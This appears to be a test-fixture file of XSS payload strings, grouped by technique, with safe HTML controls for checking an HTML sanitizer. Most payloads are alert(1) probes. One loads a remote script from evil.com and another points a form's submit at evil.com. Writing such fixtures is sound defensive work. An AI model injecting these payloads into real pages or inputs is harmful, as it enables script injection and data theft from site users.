/**
 * HTML XSS Attack Vectors — Shared Test Fixtures
 *
 * Raw HTML strings representing known XSS attack categories from spec TE02
 * §Testing Strategy. Each constant documents the attack technique.
 *
 * @module xss-vectors
 */

// ─── Script Injection ─────────────────────────────────────────────────────────

export const SCRIPT_INLINE = "<p>Safe</p><script>alert(1)</script>";
export const SCRIPT_SRC = '<script src="https://evil.com/xss.js"></script>';
export const SCRIPT_UPPER = "<SCRIPT>alert(1)</SCRIPT>";
export const SCRIPT_WITH_CONTENT_AFTER = "<p>before</p><script>alert(1)</script><p>after</p>";
export const SCRIPT_MULTILINE = "<script>\nalert(1);\nconsole.log('xss');\n</script>";

// ─── Event Handler Injection ──────────────────────────────────────────────────

export const EVENT_ONLOAD = '<img onload="alert(1)" src="x.png">';
export const EVENT_ONCLICK = '<a onclick="alert(1)">click</a>';
export const EVENT_ONFOCUS = '<div onfocus="alert(1)" tabindex="0">focus</div>';
export const EVENT_SVG = '<svg onload="alert(1)"><circle r="10" /></svg>';
export const EVENT_ONMOUSEOVER = '<p onmouseover="alert(1)">hover</p>';
export const EVENT_ONERROR = '<img src="x" onerror="alert(1)">';

// ─── JavaScript URL Injection ─────────────────────────────────────────────────

export const HREF_JAVASCRIPT = '<a href="javascript:alert(1)">click me</a>';
export const HREF_JAVASCRIPT_UPPER = '<a href="JAVASCRIPT:alert(1)">click me</a>';
export const HREF_DATA = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
export const SRC_JAVASCRIPT = '<img src="javascript:alert(1)" alt="x">';

// ─── CSS Expression / URL Injection ──────────────────────────────────────────

export const CSS_EXPRESSION = '<p style="width:expression(alert(1))">x</p>';
export const CSS_URL_JAVASCRIPT = '<p style="background:url(javascript:alert(1))">x</p>';
export const CSS_EXPRESSION_UPPER = '<p style="WIDTH:EXPRESSION(alert(1))">x</p>';

// ─── HTML Comment Attacks ─────────────────────────────────────────────────────

export const COMMENT_SIMPLE = "<!-- comment --><p>ok</p>";
export const COMMENT_WITH_CONTENT = "<!--<img src=x onerror=alert(1)>--><p>text</p>";
export const COMMENT_CONDITIONAL = "<!--[if IE]><script>alert(1)</script><![endif]-->";

// ─── srcdoc / formaction Attributes ──────────────────────────────────────────

export const SRCDOC = '<iframe srcdoc="<script>alert(1)</script>"></iframe>';
export const FORMACTION = '<form><input type="submit" formaction="https://evil.com"></form>';

// ─── Safe HTML ────────────────────────────────────────────────────────────────

export const SAFE_PARAGRAPH = "<p>Hello, world!</p>";
export const SAFE_LINK = '<a href="https://example.com">link</a>';
export const SAFE_IMAGE = '<img src="https://example.com/photo.jpg" alt="a photo">';
export const SAFE_HEADING = "<h2>Section Title</h2>";
export const SAFE_EMPHASIS = "<p>Hello <em>world</em>!</p>";
export const SAFE_CODE = "<pre><code>const x = 1;</code></pre>";
export const SAFE_BLOCKQUOTE = "<blockquote><p>A quote</p></blockquote>";
